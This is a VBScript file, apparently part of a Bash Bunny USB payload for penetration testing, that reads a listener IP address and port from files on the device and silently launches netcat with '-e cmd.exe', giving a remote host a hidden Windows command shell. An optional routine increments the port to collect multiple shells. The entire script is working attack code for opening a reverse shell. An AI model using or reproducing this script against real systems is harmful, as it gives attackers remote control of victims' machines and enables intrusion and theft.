Option Explicit

'==============================================================================
' Title:         a.vbs
' Author:        RalphyZ
' Version:       1.1a
' Target:        Windows 7+
'
' Description:
' This VBScript is used by a BashBunny payload to
' to create a netcat reverse shell.  The netcat listener
' IP Address and Port are stored in separate files - so that
' Red Teams can quickly change information.  The "IncrementPort"
' subroutine will increase the port number by 1 every time the
' script is called.  This is so that you can start multiple
' listeners while doing a PenTest, and grab multiple reverse
' shells in one trip.  Uncomment that if you want the auto-increment
'
' Note: You must put the netcat executable in the switch directory with this 
'       script in order for it to work
'==============================================================================

' Declare Constants
Const ForReading = 1
Const ForWriting = 2

' Declare Global Variables
Dim strListenerPort, strNewListenerPort, strListenerIP
Dim objFSO, objFile, strCurrentDirectory
Dim strNetCatEXE, strListnerPortFile, strListenerIPFile

' The netcat executable name
strNetCatEXE = "nc.exe"

' The file containing the listener port
strListnerPortFile = "listener_port.txt"

' The file containing the listener ip address
strListenerIPFile = "listener_ip.txt"

' Create a File System Object
Set objFSO = CreateObject("Scripting.FileSystemObject")

' Set default value
strCurrentDirectory = ""
    
' The folder location
FindCurrentDirectory

' Read the Host IP Address (where the listener resides)
ReadHostIP

' Read the listener port
ReadPort

' Increment the listener port - for multiple shells
' Great for Red Teams
'IncrementPort

' Start NetCat Reverse Shell
StartNetCat

'==============================================================================
'       Name: FindCurrentDirectory
'  Arguments: None
' Return Value: None
' Description: Find the netcat executable
'==============================================================================
sub FindCurrentDirectory
    Dim objDrives, d
           
    ' Search all drives for the netcat exe
    Set objDrives = objFSO.Drives
    For Each d in objDrives
        If (objFSO.FileExists(d + "\payloads\switch1\" + strNetCatEXE)) Then
            strCurrentDirectory =  d + "\payloads\switch1\"
            exit sub
        ElseIf (objFSO.FileExists(d + "\payloads\switch2\" + strNetCatEXE)) Then
            strCurrentDirectory =  d + "\payloads\switch2\"
            exit sub
        End if
    Next
End Sub

'==============================================================================
'       Name: ReadHostIP
'  Arguments: None
' Return Value: None
' Description: Read the listener IP                                         
'==============================================================================
Sub ReadHostIP()
    ' Opens the file for reading
    Set objFile = objFSO.OpenTextFile(strCurrentDirectory + strListenerIPFile , ForReading)
    
    ' Read the host IP
    strListenerIP = objFile.ReadAll
    
    ' Close the file
    objFile.Close    
End Sub


'==============================================================================
'       Name: ReadPort
'  Arguments: None
' Return Value: None
' Description: Read the listener port                                          
'==============================================================================
Sub ReadPort()
    ' Opens the file for reading
    Set objFile = objFSO.OpenTextFile(strCurrentDirectory + strListnerPortFile , ForReading)
    
    ' Read the listener port
    strListenerPort = objFile.ReadAll
    
    ' Close the file
    objFile.Close
End Sub

'==============================================================================
'       Name: IncrementPort
'  Arguments: None
' Return Value: None
' Description: Read the listener port, increment the counter by 1, and write   
'             the new value                                                   
'==============================================================================
Sub IncrementPort()    
    ' Increment the listener port
    strNewListenerPort = strListenerPort + 1
    	
    ' Open the file that contains the listener port for writing
    Set objFile = objFSO.OpenTextFile(strCurrentDirectory + strListnerPortFile , ForWriting)
    
    ' Write the new (incremented) port
    objFile.WriteLine strNewListenerPort
    
    ' Close the file
    objFile.Close
End Sub

'==============================================================================
'       Name: StartNetCat
'  Arguments: None
' Return Value: None
' Description: Start netcat on the appropriate port
'==============================================================================
Sub StartNetCat()
    Dim strNetCat, strCommand, objShell
    
    ' Build the path to the netcat executable    
    strNetCat = objFSO.BuildPath(strCurrentDirectory, strNetCatEXE)
    
    ' Create the command string to run netcat on the correct ip and port, 
    ' and serve cmd.exe to the listener
    strCommand = strNetCat + " -nv " + strListenerIP + " " + strListenerPort + " -e cmd.exe"
      
    ' Create the WScript Shell object       
    Set objShell = WScript.CreateObject ("WScript.Shell")
    
    ' Run the command (' , 0'= hidden)
    objShell.run strCommand, 0
    
    ' Free the object from memory
    Set objShell = Nothing
End Sub